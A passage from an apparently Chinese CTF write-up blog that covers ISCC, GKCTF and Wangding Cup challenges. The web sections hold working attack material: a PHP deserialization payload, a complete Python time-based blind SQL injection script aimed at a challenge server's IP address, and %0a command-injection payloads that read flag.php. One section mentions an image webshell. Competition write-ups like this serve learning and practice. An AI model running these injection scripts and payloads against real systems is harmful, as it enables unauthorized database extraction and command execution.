number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>im<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'test2.png'</span><span class="token punctuation">)</span></code></pre><p>因为1.txt中是这样的。<br><img src="https://img-blog.csdnimg.cn/2020051712355232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>所以改成这样的。这是学长给的改版后的脚本。<br>学习了<a href="https://blog.csdn.net/FlashKoala/article/details/90649464">PIL模块使用</a><br><code>Image.new(mode, size, color)</code> 该方法可以创建指定图像，可在上面进行一些图像操作</p><ul><li>mode 图像色彩模式</li><li>size 图像大小</li><li>color 图像初始颜色<br>奥对了，还有就是1.txt的格式要写对。像这样<br><img src="https://img-blog.csdnimg.cn/20200517124449742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这样的话，file.readline一次读一行。不进行修改的话，其实是这样的。<br><img src="https://img-blog.csdnimg.cn/20200517124859983.png" alt="j4y" loading="lazy"><br>其实它只有一行的。格式不对。<br>file.readline去读的话，直接全部读下来，无法生成想要的文件。<br>脚本是python2版本的，所以到kali中去跑。<br><code>python2 1.py 1.txt</code><br>我已经把默认的python版本改成了python3，所以这么写为了保险。<br>结果出来是一张emmm，算是一张镜像图吧。因为他是反的。原本还看错了。最后交flag时，试了几遍发现不对。然后就想到了一个办法，在一张薄纸上抄下来字符串，然后从背面看，就可以了。<br>然后再看PDF，原本以为是隐写，然后找密码，找半天没找到，就想着是不是空密码，就用工具了，反正是不正确的想法。那个工具目前还没摸清楚怎么使用。所以问了学长。意思大概就是没有太复杂的。就是提示的那样，黑白啥的，忘了。然后用鼠标滑啊滑，在最后面找到了没有显示出来的东西(奇怪，我之前也这样试过，当时啥也没找到)。粘贴到记事本上得到了后一半的flag。<br><img src="https://img-blog.csdnimg.cn/20200517130019245.png" alt="j4y" loading="lazy"></li></ul><h1 id="ISCC-Web"><a href="#ISCC-Web" class="headerlink" title="ISCC Web"></a>ISCC Web</h1><h2 id="Php-is-the-best-language"><a href="#Php-is-the-best-language" class="headerlink" title="Php is the best language"></a>Php is the best language</h2><p><img src="https://img-blog.csdnimg.cn/20200511223610118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>打开下载好文件，<br><img src="https://img-blog.csdnimg.cn/20200511224208109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>考点：PHP反序列化，还有一个魔法函数的了解。学习博客还没写好，回头另发一篇。<br>经过反序列化</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"baby"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>所以payload是</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>data<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"baby"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200511224548700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>进行base64解码，得到flag。<br><img src="https://img-blog.csdnimg.cn/20200511224636934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="ISCC成绩查询-2"><a href="#ISCC成绩查询-2" class="headerlink" title="ISCC成绩查询-2"></a>ISCC成绩查询-2</h2><p><img src="https://img-blog.csdnimg.cn/20200521143818126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>复现， 之前听学长说时时间盲注，再看一下这道题。<br>先扫描一下IP，看到了flag.php<br><img src="https://img-blog.csdnimg.cn/2020052222381096.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>但是访问就会自动跳转index.php，所以抓包来看<br><img src="https://img-blog.csdnimg.cn/2020052222392149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>看到有两个参数<code>name</code>、<code>submit</code>，get 方式传参试试。<br><img src="https://img-blog.csdnimg.cn/20200522230156190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>学长说这个是过滤了空格和<code>#</code>,<br>给我说了方法，<br>将name值设为变量，进行爆破。<br>使用字典，fuzz一下，就能得出闭合符号了。<br><img src="https://img-blog.csdnimg.cn/20200523122744534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>说一下学长的方法，他绕过是用<code>/**/</code>来代替空格，用<code>%23</code>来代替<code>#</code><br><img src="https://img-blog.csdnimg.cn/20200523115419419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以看出sleep函数被执行了，代表语句插入正确了。<br>然后用qwzf大佬写的脚本进行</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> string<span class="token keyword">import</span> time<span class="token keyword">import</span> datetime<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    chars<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits    url<span class="token operator">=</span><span class="token string">"http://101.201.126.95:7007/flag.php"</span>    <span class="token comment">#payload="'/**/or/**/if((ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;),sleep(3),1)%23" #pikachu</span>    <span class="token comment">#payload="'/**/or/**/if((ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),&#123;0&#125;,1))=&#123;1&#125;),sleep(3),1)%23"#flag</span>    <span class="token comment">#payload="'/**/or/**/if((ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=\"flag\"/**/limit/**/0,1),&#123;0&#125;,1))=&#123;1&#125;),sleep(3),1)%23"</span>    payload<span class="token operator">=</span><span class="token string">"'/**/or/**/if((ascii(substr((select/**/flag/**/from/**/flag/**/limit/**/0,1),&#123;0&#125;,1))=&#123;1&#125;),sleep(3),1)%23"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"数据："</span><span class="token punctuation">)</span>    name<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        char<span class="token operator">=</span><span class="token string">''</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> chars<span class="token punctuation">:</span>            payloads<span class="token operator">=</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            urls<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"?name="</span><span class="token operator">+</span>payloads<span class="token operator">+</span><span class="token string">"&amp;submit=%E6%9F%A5%E8%AF%A2"</span>            t1<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>            r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>urls<span class="token punctuation">)</span>            t2<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>            sec <span class="token operator">=</span> <span class="token punctuation">(</span>t2 <span class="token operator">-</span> t1<span class="token punctuation">)</span><span class="token punctuation">.</span>seconds            <span class="token keyword">if</span> sec<span class="token operator">>=</span><span class="token number">3</span><span class="token punctuation">:</span>                name<span class="token operator">+=</span>j                <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>                char<span class="token operator">=</span>j                <span class="token keyword">break</span>        <span class="token keyword">if</span> char<span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">:</span>            <span class="token keyword">break</span></code></pre><p>这个脚本是原来的用<code>/**/</code>代替空格，用<code>%23</code>代替<code>#</code>的脚本。可以得到<br><img src="https://img-blog.csdnimg.cn/20200523113909849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>MD5 解密就可以了。<br><img src="https://img-blog.csdnimg.cn/20200523122413706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>关于mysql注入的知识<a href="https://www.0x002.com/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/#">大佬博客学习学习</a></p><h2 id="ISCC成绩查询-3"><a href="#ISCC成绩查询-3" class="headerlink" title="ISCC成绩查询_3"></a>ISCC成绩查询_3</h2><p><img src="https://img-blog.csdnimg.cn/20200523125740139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200523130007303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后f12查看一下，<br><img src="https://img-blog.csdnimg.cn/20200523130127580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>不得不说，藏得真深，差点找不到。<br>意思是一个加密的函数，传入data和key然后将key进行MD5加密，再用strlen得出data和key的长度数值。<br>然后使用一个for循环将key(MD5加密后的)截取成和data的长度相同的，赋值给一个变量<code>$char</code>。再使用一个for循环</p><pre class="language-python" data-language="python"><code class="language-python">让<span class="token punctuation">(</span>原文每个字符<span class="token operator">+</span>密钥对应每个字符<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span>得到密文，赋值给变量<span class="token builtin">str</span></code></pre><p>最后<code>$str</code>进行base64加密后，返回。<br>先解出key的md5，即是密钥<br>然后对data进行base64解码得到密文<br>密文每个字符-密钥，如果&lt;0再加256；否则不用加<br>得到flag<br>用学长的解密脚本。<br>密钥也就是key上一题的flag，就是666。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$l</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">==</span> <span class="token variable">$l</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$char</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$x</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$char</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$char</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$char</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'qKe4j6uFeqaTe5rVqqaXiKig25o='</span><span class="token punctuation">;</span> <span class="token comment">// 被加密信息</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'666'</span><span class="token punctuation">;</span> <span class="token comment">// 密钥</span><span class="token variable">$decrypt</span> <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$decrypt</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/202005231344566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>得到flag，复现完成。</p><h2 id="What-can-images-do"><a href="#What-can-images-do" class="headerlink" title="What can images do"></a>What can images do</h2><p>这个我做的时候已经上传不了任何东西了，最普通的图片都传不了，题目被人搞了。不过看学长的博客，这个是最简单的传图片马，利用文件包含漏洞用蚁剑连接就行了。与那种靶场差不多的。</p><h2 id="阿帅的爱情"><a href="#阿帅的爱情" class="headerlink" title="阿帅的爱情"></a>阿帅的爱情</h2><p><img src="https://img-blog.csdnimg.cn/20200523140307725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>PHP代码审计和命令执行漏洞。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"ip"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"ip"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span><span class="token operator">=</span><span class="token double-quoted-string string">"/[;|&amp;].*[a-zA-Z]+/"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'bad domain'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ping -c 4 '</span> <span class="token punctuation">.</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>这个命令执行漏洞我前段时间刚学过，但是只了解皮毛，没有去找相关的题进行实验，所以这道题也没有做出来。<br>这个看出来是可以当作ping来使用的。而且样式是linux系统中的ping方式，需要设置参数控制发包次数。<br><img src="https://img-blog.csdnimg.cn/20200523140658855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以执行一些终端命令<br>方法是进行绕过:<a href="https://www.freebuf.com/articles/web/137923.html">参考文章</a><br>使用<code>%0a</code>绕过</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">?ip=127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token operator">%</span>0als?ip=127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token operator">%</span>0acat flag<span class="token punctuation">.</span>php</code></pre><p><img src="https://img-blog.csdnimg.cn/20200523141151886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>使用cat命令查看flag.php当中的内容。<br><img src="https://img-blog.csdnimg.cn/20200523141245609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>害，其实挺简单的。</p><h2 id="Where-is-file"><a href="#Where-is-file" class="headerlink" title="Where is file?"></a>Where is file?</h2><p>题被搞坏了，emmm 就是PHP伪协议。</p><h1 id="GKCTF-Misc"><a href="#GKCTF-Misc" class="headerlink" title="GKCTF Misc"></a>GKCTF Misc</h1><p>签到直接看视频。</p><h2 id="GKCTF2020-Pokémon"><a href="#GKCTF2020-Pokémon" class="headerlink" title="[GKCTF2020]Pokémon"></a>[GKCTF2020]Pokémon</h2><p>玩游戏，在虚拟机里下载了个模拟器，然后开始玩。我还在网上找到通关教程。真是太惨了。去百度个通关教程——<a href="https://wenku.baidu.com/view/ea843c7103768e9951e79b89680203d8ce2f6ada.html">传送门</a><br>然后闯到103道路会看到flag，不过我到那里三次才看出来。原本一直在找女主，真是傻了。还他喵的死了好几次。看下时间用了将近一个小时。枯了。<br><img src="https://img-blog.csdnimg.cn/2020052411031060.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>跑完全图就行了。注意为了节省时间，别穿草丛，说不定(很大几率，几乎可以说一定)会碰到怪兽，然后就要跟他打。费时间(都是眼泪)。<br>还有一点要注意的就是<br><img src="https://img-blog.csdnimg.cn/20200524110559639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>别碰他俩bt，他俩的怪兽都是15级，完全打不过。见了这俩请绕道走。不然还不能逃，就要重新来了。</p><h1 id="GKCTF-密码学"><a href="#GKCTF-密码学" class="headerlink" title="GKCTF 密码学"></a>GKCTF 密码学</h1><h2 id="GKCTF2020-小学生的密码学"><a href="#GKCTF2020-小学生的密码学" class="headerlink" title="[GKCTF2020]小学生的密码学"></a>[GKCTF2020]小学生的密码学</h2><p>仿射密码<br><img src="https://img-blog.csdnimg.cn/20200524134125857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>再进行base64加密就行了。</p><h1 id="2020网鼎杯——青龙组部分题目复现"><a href="#2020网鼎杯——青龙组部分题目复现" class="headerlink" title="2020网鼎杯——青龙组部分题目复现"></a>2020网鼎杯——青龙组部分题目复现</h1><h2 id="签到题-1"><a href="#签到题-1" class="headerlink" title="签到题"></a>签到题</h2><p>这个没有环境了，链接挂了。所以记录下思路<br>点开链接进行战队猜猜猜，15关猜图，全猜对弹出框，然后输入战队token，f12进入控制台可以找到flag。啥也没有了。留下张图做个纪念哈哈<br><img src="https://img-blog.csdnimg.cn/20200511235131426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><p><img src="https://img-blog.csdnimg.cn/20200511235210711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>一个exe程序，打开是做三道题：<br>第一个，解MD5字符串，直接在线网站解就行了。<br><img src="https://img-blog.csdnimg.cn/20200511233455838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>第二个，解个简单的三元一次方程组<br><img src="https://img-blog.csdnimg.cn/20200511233714921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" 